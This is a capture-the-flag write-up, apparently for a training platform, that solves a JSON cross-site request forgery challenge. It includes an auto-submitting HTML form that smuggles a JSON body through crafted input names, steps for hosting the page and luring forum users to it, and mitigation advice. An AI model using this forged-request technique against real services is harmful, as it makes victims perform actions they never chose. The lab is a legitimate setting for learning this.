# Cross Site Request Forgery Challenge JSON

## Description
`POST /user/csrfchallengejson/plusplus`
With the request body (formed in JSON): `{"userId":"exampleId"}`

Where exampleId is the ID of the user whose CSRF counter is being incremented. Your ID is: `3297ff70ad130c5b6858593e2087452b0d2afe71`

## Solution
This challenge demonstrates a CSRF vulnerability with JSON data. Although there's no CSRF token protection, the challenge is to craft an HTML form that can send JSON data in a POST request.

The key insight is to manipulate HTML form input attributes to create a valid JSON structure in the request body.

## Steps to Reproduce

### 1 Step
Create an HTML file that sends a POST request with JSON data:

```html
<form name="malForm" action="https://localhost/user/csrfchallengejson/plusplus" method="POST">
    <input type="hidden" name='{"userId":"3297ff70ad130c5b6858593e2087452b0d2afe71","' value='":"end"}'>
    <input type="submit"/>
</form>
<script> document.malForm.submit(); </script>
```

In this example, the HTML file is called `sahinyes.html`.

### 2 Step
Serve your file using Python's built-in HTTP server:

```bash
python3 -m http.server 8080
```

Make sure to run this command in the same directory as your HTML file.

### 3 Step
Post the URL to the forum. If your local server is running on port 8080, the URL would look like: `http://localhost:8080/sahinyes.html`

![](/writeups/assets/images/csrf/csrf-2-post-message.jpg)

## Exploit
When another user visits your page, the form will automatically submit, sending a POST request with JSON-like data that increments your CSRF counter.

## Impact
This vulnerability demonstrates that even without traditional CSRF tokens, applications can still be vulnerable to CSRF attacks if they don't implement proper protection mechanisms.

## Mitigation
To prevent JSON-based CSRF attacks:
- Implement proper CORS headers to restrict cross-origin requests
- Use custom headers (e.g., `X-Requested-With`) that cannot be set by standard HTML forms
- Implement SameSite cookies to prevent cross-site requests
- Validate the Content-Type header and reject requests with unexpected types
- Use anti-CSRF tokens even for JSON endpoints

---

[← Previous](./csrf-7.md) | [Next →](./csrf-1.md)

